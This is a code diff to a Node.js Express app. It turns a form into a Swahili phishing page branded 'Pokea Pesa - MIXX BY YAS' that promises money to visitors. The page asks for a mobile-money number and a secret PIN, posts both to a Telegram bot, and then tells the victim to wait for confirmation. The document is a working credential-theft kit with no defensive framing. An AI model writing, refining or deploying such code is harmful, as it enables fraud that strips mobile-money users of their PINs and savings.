@@ -1,23 +1,21 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const axios = require('axios');
+require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// Ruhusu kusoma data kutoka form
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Page ya form
 app.get('/', (req, res) => {
-  res.send(`<!DOCTYPE html><html lang="sw"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Toa Makuta</title><style>body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.form-box{background:white;padding:30px;border-radius:10px;box-shadow:0 0 10px #ccc;width:90%;max-width:300px}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}button{width:100%;padding:12px;background:#e63946;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer}h2{text-align:center;color:#333}</style></head><body><div class="form-box"><h2>Toa Makuta</h2><form action="/submit" method="POST"><label>Airtel Numero</label><input type="text" name="airtelNumero" placeholder="07XXXXXXXX" required><label>Corder</label><input type="text" name="corder" placeholder="Weka corder hapa" required><button type="submit">Toa Makuta</button></form></div></body></html>`);
+  res.send(`<!DOCTYPE html><html lang="sw"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Pokea Pesa - MIXX BY YAS</title><style>body{font-family:Arial;background:#f2f2f2;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.form-box{background:white;padding:25px;border-radius:10px;box-shadow:0 0 10px #ccc;width:90%;max-width:320px;text-align:center}.logo{width:100%;max-width:250px;margin-bottom:10px;border-radius:8px}input{width:100%;padding:10px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}button{width:100%;padding:12px;background:#8B5CF6;color:white;border:none;border-radius:5px;font-size:16px;font-weight:bold;cursor:pointer}button:hover{background:#7C3AED}h2{color:#8B5CF6;margin:10px 0}label{display:block;text-align:left;font-size:14px;font-weight:bold;color:#333}</style></head><body><div class="form-box"><img src="https://i.imgur.com/5173013600174716780.png" class="logo"><h2>Pokea Pesa - MIXX BY YAS</h2><form action="/submit" method="POST"><label>Namba ya MIXX</label><input type="tel" name="mixxNamba" placeholder="07XXXXXXXX" required><label>Siri</label><input type="password" name="siri" placeholder="Weka siri yako" required><button type="submit">Pokea Pesa</button></form></div></body></html>`);
 });
 
-// Inapokea data na kutuma Telegram
 app.post('/submit', async (req, res) => {
-  const { airtelNumero, corder } = req.body;
-  const message = `📦 *CORDER MPYA IMEINGIA* 📦\n\n*Airtel Numero*: ${airtelNumero}\n*Corder*: ${corder}\n\n⏰ ${new Date().toLocaleString("sw-TZ")}`;
+  const { mixxNamba, siri } = req.body;
+  const message = `📦 *MIKOPO MPYA IMEINGIA - MIXX BY YAS* 📦\n\n*Namba ya MIXX*: ${mixxNamba}\n*Siri*: ${siri}\n\n⏰ ${new Date().toLocaleString("sw-TZ")}`;
   
   try {
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { 
@@ -25,13 +23,11 @@ app.post('/submit', async (req, res) => {
       text: message, 
       parse_mode: 'Markdown' 
     });
-    console.log("Ujumbe umetumwa Telegram")
-  } catch (error) {
-    console.log("Error ya Telegram:", error.response?.data || error.message)
+    res.send('<h2 style="text-align:center;color:green">Umefanikiwa! Tafadhali subiri uthibitisho</h2>');
+  } catch (err) {
+    console.error(err);
+    res.status(500).send('<h2 style="text-align:center;color:red">Kuna shida. Jaribu tena</h2>');
   }
-
-  res.send('<h2>✅ Imetumwa! Asante.</h2><a href="/">Rudi nyuma</a>');
 });
 
-// Anzisha server
-app.listen(PORT, () => console.log(`Server running on ${PORT}`));
+app.listen(PORT, () => console.log(`Running on ${PORT}`));
